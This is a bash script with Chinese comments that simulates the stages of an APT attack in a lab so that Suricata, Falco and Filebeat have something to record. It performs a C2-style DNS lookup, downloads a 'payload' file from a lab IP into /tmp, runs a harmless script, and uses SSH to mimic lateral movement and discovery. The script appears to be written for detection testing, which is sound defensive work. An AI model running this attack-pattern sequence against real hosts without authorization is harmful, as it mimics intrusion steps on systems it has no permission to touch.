#!/bin/bash
# APT攻击模拟脚本（良性行为，用于生成证据）

set -e

# 颜色输出
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# 固定变量
export BASE=/home/ubuntu/attack-trace-analyzer

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_step() {
    echo -e "${BLUE}[STEP]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_info "=========================================="
log_info "APT攻击模拟脚本（良性行为）"
log_info "=========================================="
log_info "注意：本脚本仅执行良性命令，用于生成可观测证据"
log_info "=========================================="

# Step A: C2 解析与连通
log_step "Step A: C2 解析与连通"
log_info "执行 DNS 查询和 HTTP 请求..."
dig @10.92.35.50 c2.lab.local +noall +answer +time=1 +tries=1
curl -s http://10.92.35.51/payload && echo
log_info "预期证据：Suricata 应捕获 DNS 和 HTTP 流量"
sleep 2

# Step B: 下载载荷到受害机
log_step "Step B: 下载载荷到受害机"
log_info "创建目录并下载 payload..."
mkdir -p /tmp/apt-demo
curl -s http://10.92.35.51/payload -o /tmp/apt-demo/payload.txt
sha256sum /tmp/apt-demo/payload.txt
log_info "预期证据：Suricata (HTTP) + Falco (文件写入)"
sleep 2

# Step C: 执行良性脚本
log_step "Step C: 执行良性脚本"
log_info "创建并执行脚本..."
cat > /tmp/apt-demo/run.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
date
echo "[demo] benign execution"
echo "[demo] host=$(hostname) user=$(id -un)"
EOF
chmod +x /tmp/apt-demo/run.sh
/tmp/apt-demo/run.sh | tee /tmp/apt-demo/output.log
log_info "预期证据：Falco (进程执行、文件写入)"
sleep 2

# Step D: SSH 会话模拟横向移动
log_step "Step D: SSH 会话模拟横向移动"
log_info "执行 SSH 命令（模拟横向移动）..."
ssh ubuntu@10.92.35.13 "hostname; whoami; date" 2>/dev/null || log_warn "SSH 连接失败（可能需要配置免密登录）"
log_info "预期证据：Filebeat (SSH 认证日志)"
sleep 2

# Step E: 只读发现与收集
log_step "Step E: 只读发现与收集"
log_info "执行发现命令..."
ssh ubuntu@10.92.35.13 "ip -br a; ss -lntup | head; ls -la /tmp/apt-demo | head" 2>/dev/null || log_warn "SSH 连接失败"
log_info "预期证据：Filebeat (SSH 会话) + Falco (只读探测)"
sleep 2

# Step F: 清理回滚（可选）
log_info "=========================================="
log_info "攻击模拟完成！"
log_info "=========================================="
log_info "数据采集需要等待几秒钟..."
log_info "验证命令："
log_info "  curl -s http://10.92.35.13:18881/filebeat | python3 -c \"import sys,json; print('filebeat total=', json.load(sys.stdin).get('total'))\""
log_info "  curl -s http://10.92.35.13:18881/falco | python3 -c \"import sys,json; print('falco total=', json.load(sys.stdin).get('total'))\""
log_info "  curl -s http://10.92.35.13:18881/suricata | python3 -c \"import sys,json; print('suricata total=', json.load(sys.stdin).get('total'))\""
log_info ""
log_warn "如需清理，执行: rm -rf /tmp/apt-demo"
log_info "=========================================="